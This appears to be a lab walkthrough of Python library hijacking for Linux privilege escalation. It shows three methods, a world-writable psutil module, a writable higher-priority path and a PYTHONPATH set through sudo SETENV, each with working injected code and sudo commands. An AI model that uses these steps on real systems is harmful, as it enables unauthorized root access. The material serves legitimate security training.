Python has [the Python standard library](https://docs.python.org/3/library/), with many modules on board from a standard installation of Python. These modules provide many solutions that would otherwise have to be laboriously worked out by writing our programs. 

There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:

1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variable

#### Wrong Write Permissions

One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If `SUID`/`SGID` permissions have been assigned to the Python script that imports this module, our code will automatically be included.
##### Example
If we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` set. Which means we can execute as root
```bash
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

View contents
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

We can see in the second line that this script imports the module `psutil` and uses the function `virtual_memory()`.

We can look for the function in the `psutil` folder like so
```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

**We're looking for the `__init__.py` script**

With write permissions we can add the following to the function
```python
def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret
```

Run the script with sudo
```bash
sudo /usr/bin/python3 ./mem_status.py
```

#### Library Path
```shell
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.

##### Example
In order for this to make a bit more sense, let us continue with the previous example and show how this can be exploited. Previously, the `psutil` module was imported into the `mem_status.py` script. We can see `psutil`'s default installation location by issuing the following command:

```shell
htb-student@lpenix:~$ pip3 show psutil

Location: /usr/local/lib/python3.8/dist-packages
```

```shell
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .

```

After checking all of the directories listed, it appears that `/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

**In order to get to this point, we need to create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack.** This is critical as without either of these conditions being `true`, we will not be able perform this attack. After creating this file containing the example of our previous hijacking script, we have successfully prepped the system for exploitation.

Run again with sudo
```bash
sudo /usr/bin/python3 mem_status.py
```

#### PYTHONPATH Environment Variable

`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

```shell
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program.

##### Example
Lets use the `mem_status.py` script again and use this malicious funtion
```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Place malicious `psutil.py` in `/tmp` and run
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import.